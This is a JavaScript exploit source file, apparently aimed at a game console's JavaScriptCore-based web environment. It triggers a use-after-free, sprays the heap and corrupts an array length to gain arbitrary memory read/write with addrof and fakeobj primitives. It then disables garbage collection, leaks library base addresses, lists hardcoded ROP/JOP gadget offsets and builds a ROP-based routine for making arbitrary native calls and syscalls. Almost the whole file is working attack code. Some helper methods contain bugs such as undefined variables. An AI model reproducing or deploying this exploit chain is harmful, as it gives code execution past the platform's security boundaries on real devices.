class BigInt {
  /**
   * @param  {[number, number]|number|string|BigInt|ArrayLike<number>}
   */
  constructor () {
    this.buf = new ArrayBuffer(8)
    this.i8 = new Int8Array(this.buf)
    this.u8 = new Uint8Array(this.buf)
    this.i16 = new Int16Array(this.buf)
    this.u16 = new Uint16Array(this.buf)
    this.i32 = new Int32Array(this.buf)
    this.u32 = new Uint32Array(this.buf)
    this.f32 = new Float32Array(this.buf)
    this.f64 = new Float64Array(this.buf)

    switch (arguments.length) {
      case 0:
        break
      case 1:
        var val = arguments[0]
        switch (typeof val) {
          case 'boolean':
            this.u8[0] = (val === true) | 0
            break
          case 'number':
            if (isNaN(val)) {
              throw new TypeError(`value ${val} is NaN`)
            }

            if (Number.isInteger(val)) {
              if (!Number.isSafeInteger(val)) {
                throw new RangeError(`Integer ${val} outside safe 53-bit range`)
              }

              this.u32[0] = val
              this.u32[1] = val / 0x100000000
            } else {
              this.f64[0] = val
            }

            break
          case 'string':
            if (val.startsWith('0x')) {
              val = val.slice(2)
            }

            if (val.length > this.u8.length * 2) {
              throw new RangeError(`value ${val} is out of range !!`)
            }

            while (val.length < this.u8.length * 2) {
              val = '0' + val
            }

            for (var i = 0; i < this.u8.length; i++) {
              var start = val.length - 2 * (i + 1)
              var end = val.length - 2 * i
              var b = val.slice(start, end)
              this.u8[i] = parseInt(b, 16)
            }

            break
          case 'object':
            if (val instanceof BigInt) {
              this.u8.set(val.u8)
              break
            } else {
              var prop = BigInt.TYPE_MAP[val.constructor.name]
              if (prop in this) {
                var arr = this[prop]
                if (val.length !== arr.length) {
                  throw new Error(
                    `Array length mismatch, expected ${arr.length} got ${val.length}.`
                  )
                }

                arr.set(val)
                break
              }
            }
          default:
            throw new TypeError(`Unsupported value ${val} !!`)
        }
        break
      case 2:
        var hi = arguments[0]
        var lo = arguments[1]

        if (!Number.isInteger(hi)) {
          throw new RangeError(`hi value ${hi} is not an integer !!`)
        }

        if (!Number.isInteger(lo)) {
          throw new RangeError(`lo value ${lo} is not an integer !!`)
        }

        if (hi < 0 || hi > 0xFFFFFFFF) {
          throw new RangeError(`hi value ${hi} is out of 32-bit range !!`)
        }
        if (lo < 0 || lo > 0xFFFFFFFF) {
          throw new RangeError(`lo value ${lo} is out of 32-bit range !!`)
        }

        this.u32[0] = lo
        this.u32[1] = hi
        break
      default:
        throw new TypeError('Unsupported input !!')
    }
  }

  valueOf () {
    var hi = this.hi()
    var lo = this.lo()

    if (hi <= 0x1FFFFF) {
      return hi * 0x100000000 + lo
    }

    var f = this.f64[0]
    if (!isNaN(val)) {
      return f
    }

    throw new RangeError(`Unable to convert ${this} to primitive`)
  }

  toString () {
    var val = '0x'
    for (var i = this.u8.length - 1; i >= 0; i--) {
      var c = this.u8[i].toString(16).toUpperCase()
      val += c.length === 1 ? '0' + c : c
    }

    return val
  }

  endian () {
    for (var i = 0; i < this.u8.length / 2; i++) {
      var b = this.u8[i]
      this.u8[i] = this.u8[this.u8.length - 1 - i]
      this.u8[this.u8.length - 1 - i] = b
    }
  }

  lo () {
    return this.u32[0]
  }

  hi () {
    return this.u32[1]
  }

  d () {
    if (this.u8[7] === 0xFF && (this.u8[6] === 0xFF || this.u8[6] === 0xFE)) {
      throw new RangeError('Integer value cannot be represented by a double')
    }

    return this.f64[0]
  }

  jsv () {
    if ((this.u8[7] === 0 && this.u8[6] === 0) || (this.u8[7] === 0xFF && this.u8[6] === 0xFF)) {
      throw new RangeError('Integer value cannot be represented by a JSValue')
    }

    return this.sub(new BigInt(0x10000, 0)).d()
  }

  cmp (val) {
    val = val instanceof BigInt ? val : new BigInt(val)

    if (this.hi() > val.hi()) {
      return 1
    }

    if (this.hi() < val.hi()) {
      return -1
    }

    if (this.lo() > val.lo()) {
      return 1
    }

    if (this.lo() < val.lo()) {
      return -1
    }

    return 0
  }

  eq (val) {
    val = val instanceof BigInt ? val : new BigInt(val)

    return this.hi() === val.hi() && this.lo() === val.lo()
  }

  neq (val) {
    val = val instanceof BigInt ? val : new BigInt(val)

    return this.hi() !== val.hi() || this.lo() !== val.lo()
  }

  gt (val) {
    return this.cmp(val) > 0
  }

  gte (val) {
    return this.cmp(val) >= 0
  }

  lt (val) {
    return this.cmp(val) < 0
  }

  lte (val) {
    return this.cmp(val) <= 0
  }

  add (val) {
    val = val instanceof BigInt ? val : new BigInt(val)

    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var b = this.u8[i] + val.u8[i] + c
      c = (b > 0xFF) | 0
      ret.u8[i] = b
    }

    if (c !== 0) {
      throw new Error('add overflowed !!')
    }

    return ret
  }

  sub (val) {
    val = val instanceof BigInt ? val : new BigInt(val)

    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var b = this.u8[i] - val.u8[i] - c
      c = (b < 0) | 0
      ret.u8[i] = b
    }

    if (c !== 0) {
      throw new Error('sub underflowed !!')
    }

    return ret
  }

  mul (val) {
    val = val instanceof BigInt ? val : new BigInt(val)

    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var s = c
      for (var j = 0; j <= i; j++) {
        s += this.u8[j] * (val.u8[i - j] || 0)
      }

      ret.u8[i] = s & 0xFF
      c = s >>> 8
    }

    if (c !== 0) {
      throw new Error('mul overflowed !!')
    }

    return ret
  }

  divmod (val) {
    val = val instanceof BigInt ? val : new BigInt(val)

    if (!val.gte(BigInt.Zero)) {
      throw new Error('Division by zero')
    }

    var q = new BigInt()
    var r = new BigInt()

    for (var b = (this.buf.byteLength * 8) - 1; b >= 0; b--) {
      r = r.shl(1)

      var byte_idx = Math.floor(b / 8)
      var bit_idx = b % 8

      r.u8[0] |= (this.u8[byte_idx] >> bit_idx) & 1

      if (r.gte(val)) {
        r = r.sub(val)

        q.u8[byte_idx] |= 1 << bit_idx
      }
    }

    return { q, r }
  }

  div (val) {
    return this.divmod(val).q
  }

  mod (val) {
    return this.divmod(val).r
  }

  xor (val) {
    val = val instanceof BigInt ? val : new BigInt(val)

    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] ^ val.u8[i]
    }

    return ret
  }

  and (val) {
    val = val instanceof BigInt ? val : new BigInt(val)

    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] & val.u8[i]
    }

    return ret
  }

  or (val) {
    val = val instanceof BigInt ? val : new BigInt(val)

    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] | val.u8[i]
    }

    return ret
  }

  neg () {
    val = val instanceof BigInt ? val : new BigInt(val)

    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = ~this.u8[i]
    }

    return ret.and(BigInt.One)
  }

  shl (count) {
    if (count < 0 || count > 64) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    var ret = new BigInt()

    var byte_count = Math.floor(count / 8)
    var bit_count = count % 8

    for (var i = this.buf.byteLength - 1; i >= 0; i--) {
      var t = i - byte_count
      var b = t >= 0 ? this.u8[t] : 0

      if (bit_count) {
        var p = t - 1 >= 0 ? this.u8[t - 1] : 0
        b = ((b << bit_count) | (p >> (8 - bit_count))) & 0xFF
      }

      ret.u8[i] = b
    }

    return ret
  }

  shr (count) {
    if (count < 0 || count > 64) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    var ret = new BigInt()

    var byte_count = Math.floor(count / 8)
    var bit_count = count % 8

    for (var i = 0; i < this.buf.byteLength; i++) {
      var t = i + byte_count
      var b = t >= 0 ? this.u8[t] : 0

      if (bit_count) {
        var n = t + 1 >= 0 ? this.u8[t + 1] : 0
        b = ((b >> bit_count) | (n << (8 - bit_count))) & 0xff
      }

      ret.u8[i] = b
    }

    return ret
  }
}

BigInt.Zero = new BigInt()
BigInt.One = new BigInt(1)
BigInt.TYPE_MAP = {
  Int8Array: 'i8',
  Uint8Array: 'u8',
  Int16Array: 'i16',
  Uint16Array: 'u16',
  Int32Array: 'i32',
  Uint32Array: 'u32',
  Float32Array: 'f32',
  Float64Array: 'f64',
}

// include('globals.js')
// include('util.js')

DataView.prototype.getBigInt = function (byteOffset, littleEndian) {
  littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian

  var lo = this.getUint32(byteOffset, true)
  var hi = this.getUint32(byteOffset + 4, true)

  return new BigInt(hi, lo)
}

DataView.prototype.setBigInt = function (byteOffset, value, littleEndian) {
  value = (value instanceof BigInt) ? value : new BigInt(value)
  littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian

  this.setUint32(byteOffset, value.lo(), littleEndian)
  this.setUint32(byteOffset + 4, value.hi(), littleEndian)
}

/**
 * @type {Struct}
 */
var struct = {
  create: function (name, fields) {
    var [sizeof, infos] = struct.parse(fields)

    var cls = class {
      constructor (addr) {
        this.addr = addr
      }
    }

    cls.tname = name
    cls.sizeof = sizeof
    cls.fields = fields

    for (var info of infos) {
      struct.define_property(cls, info)
    }

    return cls
  },
  parse: function (fields) {
    var infos = []
    var offset = 0
    var struct_alignment = 1
    for (var field of fields) {
      var size = 0
      var alignment = 0
      var pointer = false
      var type = field.type

      var [, name, count] = field.name.match(/^(.+?)(?:\[(\d+)\])?$/)

      if (type.includes('*')) {
        size = 8
        alignment = 8
        pointer = true
      } else if (field.name in this) {
        size = this[field.name].sizeof
      } else {
        var bits = type.replace(/\D/g, '')
        if (bits % 8 !== 0) {
          throw new Error(`Invalid primitive type ${type}`)
        }

        size = bits / 8
        alignment = size
      }

      if (size === 0) {
        throw new Error(`Invalid size for ${field_name} !!`)
      }

      count = count ? parseInt(count) : 1

      if (offset % alignment !== 0) {
        offset += alignment - (offset % alignment)
      }

      infos.push({ type, name, offset, size, count, pointer })

      offset += size * count

      if (alignment > struct_alignment) {
        struct_alignment = alignment
      }
    }

    if (offset % struct_alignment !== 0) {
      offset += struct_alignment - (offset % struct_alignment)
    }

    return [offset, infos]
  },
  define_property: function (cls, info) {
    Object.defineProperty(cls.prototype, info.name, {
      get: function () {
        if (info.count > 1) {
          var addr = this.addr.add(info.offset)
          if (info.pointer) {
            addr = mem.read8(addr)
          }

          var arr
          switch (info.type) {
            case 'Int8':
              arr = new Int8Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Uint8':
              arr = new Uint8Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Int16':
              arr = new Int16Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Uint16':
              arr = new Uint16Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Int32':
              arr = new Int32Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Uint32':
              arr = new Uint32Array(info.count)
              utils.set_backing(arr, addr)
              break
            case 'Int64':
              arr = new Uint32Array(info.count * 2)
              utils.set_backing(arr, addr)
            case 'Uint64':
              arr = new Uint32Array(info.count * 2)
              utils.set_backing(arr, addr)
            default:
              if (info.type in this) {
                for (var i = 0; i < info.count; i++) {
                  arr[i] = new this[info.name](addr.add(i * info.size))
                }
              }

              throw new Error(`Invalid type ${info.type}`)
          }

          return arr
        } else {
          var val = mem.read8(this.addr.add(info.offset))
          switch (info.type) {
            case 'Int8': return val.i8[0]
            case 'Uint8': return val.u8[0]
            case 'Int16': return val.i16[0]
            case 'Uint16': return val.u16[0]
            case 'Int32': return val.i32[0]
            case 'Uint32': return val.u32[0]
            case 'Int64': return val
            case 'Uint64': return val
            default:
              if (info.pointer) {
                return val
              }

              throw new Error(`Invalid type ${info.type}`)
          }
        }
      },
      set: function (value) {
        if (info.count > 1) {
          if (!value.buffer) {
            throw new Error('value is not a typed array')
          }

          if (value.buffer.byteLength !== info.size * info.count) {
            throw new Error(`expected ${info.size * info.count} bytes got ${value.buffer.byteLength}`)
          }

          var addr = this.addr.add(info.offset)
          if (info.type.includes('*')) {
            addr = mem.read8(addr)
          }

          var buf = new Uint8Array(info.size * info.count)
          utils.set_backing(buf, addr)

          buf.set(value)
        } else {
          var temp = mem.read8(this.addr.add(info.offset))
          switch (info.type) {
            case 'Int8':
              temp.i8[0] = value
              break
            case 'Uint8':
              temp.u8[0] = value
              break
            case 'Int16':
              temp.i16[0] = value
              break
            case 'Uint16':
              temp.u16[0] = value
              break
            case 'Int32':
              temp.i32[0] = value
              break
            case 'Uint32':
              temp.u32[0] = value
              break
            case 'Int64':
              temp = value
              break
            case 'Uint64':
              temp = value
              break
            default:
              if (info.type.includes('*')) {
                temp = value
                break
              }

              throw new Error(`Invalid type ${info.type}`)
          }

          mem.write8(this.addr.add(info.offset), temp)
        }
      }
    })
  }
}

var NotificationRequest = struct.create('NotificationRequest', [
  { type: 'Int32', name: 'type' },
  { type: 'Int32', name: 'reqId' },
  { type: 'Int32', name: 'priority' },
  { type: 'Int32', name: 'msg_id' },
  { type: 'Int32', name: 'target_id' },
  { type: 'Int32', name: 'user_id' },
  { type: 'Int32', name: 'unk1' },
  { type: 'Int32', name: 'unk2' },
  { type: 'Int32', name: 'app_id' },
  { type: 'Int32', name: 'error_num' },
  { type: 'Int32', name: 'unk3' },
  { type: 'Uint8', name: 'use_icon_image_uri' },
  { type: 'Uint8', name: 'message[1024]' },
  { type: 'Uint8', name: 'icon_uri[1024]' },
  { type: 'Uint8', name: 'unk[1024]' },
])

function make_uaf (arr) {
  var o = {}
  for (var i in { xx: '' }) {
    for (i of [arr]);
    o[i]
  }
}

// needed for arw
var marked_arr_idx = -1
var corrupted_spray_idx = -1
var marker = new BigInt(0x13371337, 0x13371337) // used to find sprayed array

// used for arw
var master, slave

// arw leak addresses
var leak_obj, leak_obj_addr, master_addr

// store Uint32Array structure ids to be used for fake master id later
var u32_structs = new Array(0x100)
for (var i = 0; i < u32_structs.length; i++) {
  u32_structs[i] = new Uint32Array(1)
  u32_structs[i][`spray_${i}`] = 0x1337
}

log('Initiate UAF...')

// Pre-shape heap with small allocations
for (var pre = 0; pre < 0x100; pre++) {
  var tmp = new Uint32Array(0x10)
}

var uaf_arr = new Uint32Array(0x40000)

// fake m_hashAndFlags
uaf_arr[4] = 0xB0

make_uaf(uaf_arr)

log('Achieved UAF !!')

// Small delay before spray
for (var d = 0; d < 1000; d++);

log('Spraying arrays with marker...')
// spray candidates arrays to be used as leak primitive (increased from 0x800)
var spray = new Array(0x1000)
for (var i = 0; i < spray.length; i++) {
  spray[i] = [marker.jsv(), {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}]
}

log('Looking for marked array...')
// find sprayed candidate by marker then corrupt its length
for (var i = 0; i < uaf_arr.length; i += 2) {
  var val = new BigInt(uaf_arr[i + 1], uaf_arr[i])
  if (val.eq(marker)) {
    log(`Found marker at uaf_arr[${i}] !!`)

    marked_arr_idx = i - 2

    log(`Marked array length ${new BigInt(uaf_arr[marked_arr_idx])}`)

    log('Corrupting marked array length...')
    // corrupt indexing header
    uaf_arr[marked_arr_idx] = 0x1337
    uaf_arr[marked_arr_idx + 1] = 0x1337
    break
  }
}

if (marked_arr_idx === -1) {
  throw new Error('Failed to find marked array !!')
}

// find index of corrupted array
for (var i = 0; i < spray.length; i++) {
  if (spray[i].length === 0x1337) {
    log(`Found corrupted array at spray[${i}] !!`)
    log(`Corrupted array length ${new BigInt(spray[i].length)}`)

    corrupted_spray_idx = i
    break
  }
}

if (corrupted_spray_idx === -1) {
  throw new Error('Failed to find corrupted array !!')
}

log('Initiate ARW...')

var marked_arr_obj_idx = marked_arr_idx + 4

slave = new Uint32Array(0x1000)
slave[0] = 0x13371337

// leak address of leak_obj
leak_obj = { obj: slave }

spray[corrupted_spray_idx][1] = leak_obj

leak_obj_addr = new BigInt(uaf_arr[marked_arr_obj_idx + 1], uaf_arr[marked_arr_obj_idx])

// try faking Uint32Array master by incremental structure_id until it matches from one of sprayed earlier in structs array
var structure_id = 0x80
while (!(master instanceof Uint32Array)) {
  var rw_obj = {
    js_cell: new BigInt(0x1182300, structure_id++).jsv(),
    butterfly: 0,
    vector: slave,
    length_and_flags: 0x1337
  }

  spray[corrupted_spray_idx][1] = rw_obj

  var rw_obj_addr = new BigInt(uaf_arr[marked_arr_obj_idx + 1], uaf_arr[marked_arr_obj_idx])

  rw_obj_addr = rw_obj_addr.add(0x10)

  uaf_arr[marked_arr_obj_idx] = rw_obj_addr.lo()
  uaf_arr[marked_arr_obj_idx + 1] = rw_obj_addr.hi()

  master = spray[corrupted_spray_idx][1]
}

master_addr = new BigInt(master[5], master[4])

debug(`master_addr: ${master_addr}`)
log('Achieved ARW !!')

/**
 * @type {Mem}
 */
var mem = {
  allocs: new Map(),
  read8: function (addr) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    var retval = new BigInt(slave[1], slave[0])
    return retval
  },
  read4: function (addr) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    var retval = new BigInt(slave[0])
    return retval
  },
  write8: function (addr, val) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    if (val instanceof BigInt) {
      slave[0] = val.lo()
      slave[1] = val.hi()
    } else {
      slave[0] = val
      slave[1] = 0
    }
  },
  write4: function (addr, val) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    slave[0] = val
  },
  write1: function (addr, val) {
    var byte_val = (val instanceof BigInt) ? val.lo() : val
    var offset = addr.lo() & 3
    var aligned_addr = new BigInt(addr.hi(), addr.lo() & ~3)

    // Read current 4-byte value at aligned address
    master[4] = aligned_addr.lo()
    master[5] = aligned_addr.hi()
    var current = slave[0]

    // Modify the specific byte
    var mask = 0xFF << (offset * 8)
    var new_val = (current & ~mask) | ((byte_val & 0xFF) << (offset * 8))

    // Write back the modified 4-byte value
    slave[0] = new_val
  },
  addrof: function (obj) {
    leak_obj.obj = obj
    return mem.read8(leak_obj_addr.add(0x10))
  },
  fakeobj: function (addr) {
    mem.write8(leak_obj_addr.add(0x10), addr)
    return leak_obj.obj
  },
  malloc: function (count) {
    var buf = new Uint8Array(count)
    var backing = utils.get_backing(buf)
    mem.allocs.set(backing, buf)
    return backing
  },
  free: function (addr) {
    if (mem.allocs.has(addr)) {
      mem.allocs.delete(addr)
    }
  },
  free_all: function () {
    mem.allocs.clear()
  }
}

/**
 * @type {Utils}
 */
var utils = {
  base_addr: function (func_addr) {
    var module_info_addr = mem.malloc(0x130)

    mem.write8(module_info_addr, new BigInt(0x130))

    if (!sceKernelGetModuleInfoForUnwind(func_addr, 1, module_info_addr).eq(0)) {
      throw new Error(`Unable to get ${func_addr} base addr`)
    }

    var base_addr = mem.read8(module_info_addr.add(0x120))

    mem.free(module_info_addr)

    return base_addr
  },
  notify: function (msg) {
    var notify_addr = mem.malloc(NotificationRequest.sizeof)

    var notify = new NotificationRequest(notify_addr)

    for (var i = 0; i < msg.length; i++) {
      notify.message[i] = msg.charCodeAt(i) & 0xFF
    }

    notify.message[msg.length] = 0

    var fd = open('/dev/notification0', 1, 0)
    if (fd.lt(0)) {
      throw new Error('Unable to open /dev/notification0 !!')
    }

    write(fd, notify.addr, NotificationRequest.sizeof)
    close(fd)

    mem.free(notify_addr)
  },
  str: function (addr) {
    var chars = []

    var term = false
    var offset = 0
    while (!term) {
      var val = mem.read8(addr.add(offset))
      for (var i = 0; i < val.u8.length; i++) {
        var c = val.u8[i]
        if (c === 0) {
          term = true
          break
        }

        chars.push(c)
      }

      offset += 8
    }

    return String.fromCharCode(...chars)
  },
  cstr: function (str) {
    var bytes = new Uint8Array(str.length + 1)

    for (var i = 0; i < str.length; i++) {
      bytes[i] = str.charCodeAt(i) & 0xFF
    }

    bytes[str.length] = 0

    var backing = utils.get_backing(bytes)
    mem.allocs.set(backing, bytes)
    return backing
  },
  get_backing: function (view) {
    return mem.read8(mem.addrof(view).add(0x10))
  },
  set_backing: function (view, addr) {
    return mem.write8(mem.addrof(view).add(0x10), addr)
  }
}

var math_min_addr = mem.addrof(Math.min)
debug(`addrof(Math.min): ${math_min_addr}`)

var scope = mem.read8(math_min_addr.add(0x10))
debug(`scope: ${scope}`)

var native_executable = mem.read8(math_min_addr.add(0x18))
debug(`native_executable: ${native_executable}`)

var native_executable_function = mem.read8(native_executable.add(0x40))
debug(`native_executable_function: ${native_executable_function}`)

var native_executable_constructor = mem.read8(native_executable.add(0x48))
debug(`native_executable_constructor: ${native_executable_constructor}`)

var jsc_addr = native_executable_function.sub(0xC6380)

mem.write4(jsc_addr.add(0x1E75B20), 1)
log('disabled GC')

var _error_addr = mem.read8(jsc_addr.add(0x1E72398))
debug(`_error_addr: ${_error_addr}`)

var strerror_addr = mem.read8(jsc_addr.add(0x1E723B8))
debug(`strerror_addr: ${strerror_addr}`)

var libc_addr = strerror_addr.sub(0x40410)

var jsmaf_gc_addr = mem.addrof(jsmaf.gc)
debug(`addrof(jsmaf.gc): ${jsmaf_gc_addr}`)

var native_invoke_addr = mem.read8(jsmaf_gc_addr.add(0x18))
debug(`native_invoke_addr: ${native_invoke_addr}`)

var eboot_addr = native_invoke_addr.sub(0x39330)

var gadgets = {
  RET: jsc_addr.add(0x4C),
  POP_R10_RET: jsc_addr.add(0x19E297C),
  POP_R12_RET: jsc_addr.add(0x3F3231),
  POP_R14_RET: jsc_addr.add(0x15BE0A),
  POP_R15_RET: jsc_addr.add(0x93CD7),
  POP_R8_RET: jsc_addr.add(0x19BFF1),
  POP_R9_JO_RET: jsc_addr.add(0x72277C),
  POP_RAX_RET: jsc_addr.add(0x54094),
  POP_RBP_RET: jsc_addr.add(0xC7),
  POP_RBX_RET: jsc_addr.add(0x9D314),
  POP_RCX_RET: jsc_addr.add(0x2C3DF3),
  POP_RDI_RET: jsc_addr.add(0x93CD8),
  POP_RDX_RET: jsc_addr.add(0x3A3DA2),
  POP_RSI_RET: jsc_addr.add(0xCFEFE),
  POP_RSP_RET: jsc_addr.add(0xC89EE),
  LEAVE_RET: jsc_addr.add(0x50C33),
  MOV_RAX_QWORD_PTR_RDI_RET: jsc_addr.add(0x36073),
  MOV_QWORD_PTR_RDI_RAX_RET: jsc_addr.add(0x27FD0),
  MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40: jsc_addr.add(0x46E8F0),
  PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18: jsc_addr.add(0x3F6F70),
  MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: jsc_addr.add(0x18B3B5),
  PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22: jsc_addr.add(0x1E25AA1),
  PUSH_RBP_POP_RCX_RET: jsc_addr.add(0x1737EEE),
  MOV_RAX_RCX_RET: jsc_addr.add(0x41015),
  PUSH_RAX_POP_RBP_RET: jsc_addr.add(0x4E82B9)
}

/**
 * @type {Rop}
 */
var rop = {
  idx: 0,
  base: 0x2500,
  jop_stack_store: undefined,
  jop_stack_addr: undefined,
  stack_addr: undefined,
  fake: undefined,
  fake_func: null,
  init: function () {
    log('Initiate ROP...')

    rop.jop_stack_store = mem.malloc(8)
    rop.jop_stack_addr = mem.malloc(0x6A)
    rop.stack_addr = mem.malloc(0x5000)

    var jop_stack_base_addr = rop.jop_stack_addr.add(0x22)

    mem.write8(rop.jop_stack_addr, gadgets.POP_RSP_RET)
    mem.write8(jop_stack_base_addr, rop.stack_addr)
    mem.write8(jop_stack_base_addr.add(0x10), gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22)
    mem.write8(jop_stack_base_addr.add(0x18), gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10)
    mem.write8(jop_stack_base_addr.add(0x40), gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18)

    mem.write8(rop.jop_stack_store, jop_stack_base_addr)

    rop.fake = rop.fake_builtin(gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40)
    rop.reset()

    log('Achieved ROP !!')
  },
  free: function () {
    mem.free(rop.fake.executable)
    mem.free(rop.jop_stack_store)
    mem.free(rop.jop_stack_addr)
  },
  reset: function () {
    rop.idx = rop.base
  },
  push: function (val) {
    if (rop.idx > 0x5000) {
      throw new Error('Stack full !!')
    }

    mem.write8(rop.stack_addr.add(new BigInt(0, rop.idx)), val)
    rop.idx += 8
  },
  execute: function (insts, store_addr, store_size) {
    if (store_size % 8 !== 0) {
      throw new Error('Invalid store, not aligned by 8 bytes')
    }

    if (store_size < 8) {
      throw new Error('Invalid store, minimal size is 8 to store RSP')
    }

    // Reset index but don't zero memory - JSC may reference it
    rop.idx = 0

    var header = []

    header.push(gadgets.PUSH_RBP_POP_RCX_RET)
    header.push(gadgets.MOV_RAX_RCX_RET)
    rop.store(header, store_addr, 0)

    var footer = []

    rop.load(footer, store_addr, 0)
    footer.push(gadgets.PUSH_RAX_POP_RBP_RET)
    footer.push(gadgets.POP_RAX_RET)
    footer.push(new BigInt(0, 0xa)) // JSValue for undefined
    footer.push(gadgets.LEAVE_RET)

    insts = header.concat(insts).concat(footer)

    for (var i = 0; i < insts.length; i++) {
      rop.push(insts[i])
    }

    // Reuse pre-allocated JOP structures
    var jop_stack_base_addr = rop.jop_stack_addr.add(new BigInt(0, 0x22))

    mem.write8(rop.jop_stack_addr, gadgets.POP_RSP_RET)
    mem.write8(jop_stack_base_addr, rop.stack_addr)
    mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x10)), gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22)
    mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x18)), gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10)
    mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x40)), gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18)

    mem.write8(rop.jop_stack_store, jop_stack_base_addr)

    // Create fake function only once
    if (rop.fake_func === null) {
      rop.fake_func = rop.fake_builtin(gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40)
    }

    rop.fake_func(0, 0, 0, mem.fakeobj(rop.jop_stack_store))

    // Restore leak_obj to valid state - JSC may access it
    leak_obj.obj = {}

    // Don't free - structures are reused across executions
    // Don't clear ROP stack either - JSC may still reference it
  },
  fake_builtin: function (addr) {
    function fake () {}

    var fake_native_executable = mem.malloc(0x60)
    debug(`fake_native_executable: ${fake_native_executable}`)

    for (var i = 0; i < 0x60; i += 8) {
      var val = mem.read8(native_executable.add(i))
      mem.write8(fake_native_executable.add(i), val)
    }

    mem.write8(fake_native_executable.add(0x40), addr)

    var fake_addr = mem.addrof(fake)
    debug(`addrof(fake): ${fake_addr}`)

    mem.write8(fake_addr.add(0x10), scope)
    mem.write8(fake_addr.add(0x18), fake_native_executable)

    fake.executable = fake_native_executable

    return fake
  },
  store (insts, addr, index) {
    insts.push(gadgets.POP_RDI_RET)
    insts.push(addr.add(index * 8))
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
  },
  load (insts, addr, index) {
    insts.push(gadgets.POP_RDI_RET)
    insts.push(addr.add(index * 8))
    insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET)
  }
}

class SyscallError extends Error {
  constructor (syscall, errno, strerror) {
    super(`${syscall} returned errno ${errno}: ${strerror}`)
    this.syscall = syscall
    this.errno = errno
    this.strerror = strerror
  }
}

/**
 * @type {Fn}
 */
var fn = {
  // args is just for typing, not used
  create: function (input, _args, ret) {
    var id
    var addr
    var syscall = false
    if (input instanceof BigInt) {
      addr = input
    } else if (typeof input === 'number') {
      if (!syscalls.map.has(input)) {
        throw new Error(`Syscall id ${input} not found !!`)
      }

      id = new BigInt(input)
      addr = syscalls.map.get(input)
      syscall = true
    }

    var f = function () {
      if (arguments.length > 6) {
        throw new Error('More than 6 arguments is not supported !!')
      }

      var ctx = []
      var insts = []

      var regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]

      insts.push(gadgets.POP_RAX_RET)
      insts.push(syscall ? id : BigInt.Zero)

      for (var i = 0; i < arguments.length; i++) {
        var reg = regs[i]
        var value = arguments[i]

        insts.push(reg)

        switch (typeof value) {
          case 'boolean':
          case 'number':
            value = new BigInt(value)
            break
          case 'string':
            value = utils.cstr(value)
            ctx.push(value)
            break
          default:
            if (!(value instanceof BigInt)) {
              throw new Error(`Invalid value at arg ${i}`)
            }
            break
        }

        insts.push(value)
      }

      insts.push(addr)

      var store_size = ret ? 0x10 : 8
      var store_addr = mem.malloc(store_size)

      if (ret) {
        rop.store(insts, store_addr, 1)
      }

      rop.execute(insts, store_addr, store_size)

      while (ctx.length > 0) {
        mem.free(ctx.pop())
      }

      var result
      if (ret) {
        result = mem.read8(store_addr.add(8))

        if (syscall) {
          if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
            mem.free(store_addr)

            var errno_addr = _error()
            var errno = mem.read4(errno_addr)
            var str = strerror(errno)

            throw new SyscallError(input, Number(errno), str)
          }
        }

        switch (ret) {
          case 'bigint':
            break
          case 'boolean':
            result = result.eq(BigInt.One)
            break
          case 'string':
            result = utils.str(result)
            break
          default:
            throw new Error(`Unsupported return type ${ret}`)
        }
      }

      mem.free(store_addr)

      return result
    }

